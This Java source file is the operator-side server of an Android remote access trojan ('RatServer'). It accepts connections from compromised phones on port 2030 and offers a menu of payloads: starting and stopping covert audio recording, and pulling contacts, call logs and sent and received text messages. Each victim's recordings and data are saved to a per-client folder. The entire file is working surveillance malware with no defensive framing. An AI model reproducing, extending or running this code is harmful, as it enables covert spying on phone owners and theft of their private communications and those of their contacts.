import com.example.androidrat.interfaces.Payload;
import com.example.androidrat.interfaces.Response;
import com.example.androidrat.models.CallLog;
import com.example.androidrat.models.Contact;
import com.example.androidrat.models.Message;
import com.example.androidrat.payloads.*;
import com.example.androidrat.responses.*;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;

public class RatServer {
    private List<String> payloads;

    public RatServer() {
        this.payloads = new ArrayList<>();
        setPayloads();
    }

    private void start() {
        try {
            ServerSocket serverSocket = new ServerSocket(2030, 10);
            System.out.println("Server running...");
            while(true) {
                Socket clientSocket = serverSocket.accept();
                System.out.println("Client has connected");

                //handle each connection on a different thread in order for other clients to connect
                new ClientThread(clientSocket).start();
                //client thread running
            }

        } catch (IOException e) {
            System.out.println("Failed Starting server");
        }
    }
    class ClientThread extends Thread {
        private final Socket clientSocket;
        private ObjectOutputStream outputStream;
        private final String clientName;
        public ClientThread(Socket clientSocket) {
            super();
            this.clientSocket = clientSocket;
            this.clientName = clientSocket.getInetAddress().getHostName();
            //create necessary folder for the current client to store client data
            createClientFolder();
        }
        private void createClientFolder() {
            String clientName = clientSocket.getInetAddress().getHostName();
            String path = "Clients\\"+clientName;
            File clientFile = new File(path);
            if(clientFile.exists()) {
                System.out.printf("Folder for %s already exists\n", clientName);
                return;
            }
            boolean clientFolderCreated = clientFile.mkdirs();
            if(clientFolderCreated) System.out.println("Successfully created folder for client: " + clientName);
            else System.out.println("Failed creating folder");
        }
        @Override
        public void run() {
            //run this thread until it's interrupted
            while(!interrupted()) {
                try {
                    outputStream = new ObjectOutputStream(clientSocket.getOutputStream());
                    ObjectInputStream inputStream = new ObjectInputStream(clientSocket.getInputStream());
                    System.out.println("Obtained client I/O streams");

                    //show menu
                    displayPayloads();
                    // Take console input to send to
                    do {
                        int payloadOption = getPayloadOption();
                        //process payload option
                        processPayloadOption(payloadOption);
                        if(payloadOption != 0) {
                            Object payloadResponse = inputStream.readObject();
                            if (payloadResponse instanceof Response) {
                                displayResponse((Response) payloadResponse);
                            }
                        }
                    } while (!interrupted());
                }catch (IOException e) {
                    System.out.println("Failed obtaining client I/O streams");
                }catch (ClassNotFoundException e) {
                    System.out.println("Received unknown payload from client");
                }
            }
        }
        private void processPayloadOption(int payloadOption) {
            switch (payloadOption) {
                case 0:
                    displayPayloads();
                    break;
                case 1:
                    sendPayloadToClient(new StartRecordingPayload());
                    break;
                case 2:
                    sendPayloadToClient(new StopRecordingPayload());
                    break;
                case 3:
                    // Contacts
                    sendPayloadToClient(new ContactsPayload());
                    break;
                case 4:
                    sendPayloadToClient(new CallLogsPayload());
                    break;
                case 5:
                    sendPayloadToClient(new ReceivedMessagesPayload());
                    break;
                case 6:
                    sendPayloadToClient(new SentMessagesPayload());
                    break;
                case 7:
                    sendPayloadToClient(new CloseConnectionPayload());
                    interrupt();
                    break;
            }
        }
        private void sendPayloadToClient(Payload payload) {
            try {
                outputStream.reset();
                outputStream.writeObject(payload);
                outputStream.flush();
            }catch (IOException e) {
                System.out.println("Failed sending payload to client");
            }
        }
        private void displayResponse(Response response) {
            if(response instanceof RecordingStartedResponse) {
                System.out.println("Recording started...");
            }
            else if(response instanceof RecordingResponse) {
                RecordingResponse recordingResponse = (RecordingResponse) response;
                byte[] audioBytes = recordingResponse.audioBytes;
                String fileName = getFileName();
                saveFile(clientName, fileName, audioBytes);
            }
            else if(response instanceof ContactsResponse) {
                ContactsResponse contactsResponse = (ContactsResponse) response;
                List<Contact> contactList = contactsResponse.contactList;
                saveFile(clientName, "contacts.txt", contactList.toString().getBytes());
                for(Contact contact : contactList)
                    System.out.println(contact);
            }
            else if(response instanceof CallLogsResponse) {
                CallLogsResponse callLogsResponse = (CallLogsResponse) response;
                List<CallLog> callLogList = callLogsResponse.callLogList;
                saveFile(clientName, "callLogs.txt", callLogList.toString().getBytes());
                for(CallLog callLog : callLogList)
                    System.out.println(callLog);
            }
            else if(response instanceof ReceivedMessagesResponse) {
                ReceivedMessagesResponse receivedMessagesResponse = (ReceivedMessagesResponse) response;
                List<Message> messageList = receivedMessagesResponse.messageList;
                saveFile(clientName, "ReceivedMessages.txt", messageList.toString().getBytes());
                for(Message message : messageList)
                    System.out.println(message);
            }
            else if(response instanceof SentMessagesResponse) {
                SentMessagesResponse sentMessagesResponse = (SentMessagesResponse) response;
                List<Message> messageList = sentMessagesResponse.messageList;
                saveFile(clientName, "SentMessages.txt", messageList.toString().getBytes());
                for(Message message : messageList)
                    System.out.println(message);
            }
        }
        private String getFileName() {
            LocalDateTime currentDateTime = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss");
            String formattedDateTime = currentDateTime.format(formatter);
            return formattedDateTime + ".mp3";
        }
        private void saveFile(String folderName, String fileName, byte[] fileBytes) {
            String fullPath = String.format("Clients\\%s\\%s", folderName, fileName);
            File file = new File(fullPath);
            if(file.exists()) {
                System.out.printf("File: %s, already exists\n", fileName);
                return;
            }
            try {
                if(file.createNewFile()) System.out.printf("File: %s, created successfully\n", fileName);
            }catch (IOException e) {
                System.out.println("Failed creating file: " + fileName);
                return;
            }

            try {
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                fileOutputStream.write(fileBytes);
                fileOutputStream.close();
            }catch (IOException e) {
                System.out.println("Failed reading file from client");
            }

        }
    }
    private void setPayloads() {
        payloads = Arrays.asList(
            "Display Payloads", "Start Recording", "Stop Recording", "Contacts", "Call Logs", "Received Messages", "Sent Messages", "Close Connection"
        );
    }
    private void displayPayloads() {
        int payloadOption = 0;
        System.out.println("\n************************ Payloads ************************");
        for(String payload : payloads)
            System.out.printf("%d: %s\n", payloadOption++, payload);
    }
    private int getPayloadOption() {
        System.out.print("Payload: ");
        Scanner scanner = new Scanner(System.in);
        int payloadOption = -1;
        do {
            try {
                payloadOption = scanner.nextInt();
            }catch (Exception e) {
                System.out.println("Provide valid payload option");
            }
        }while(payloadOption < 0 || payloadOption >= payloads.size());
        return payloadOption;
    }
    public static void main(String[] args) {
        new RatServer().start();
    }
}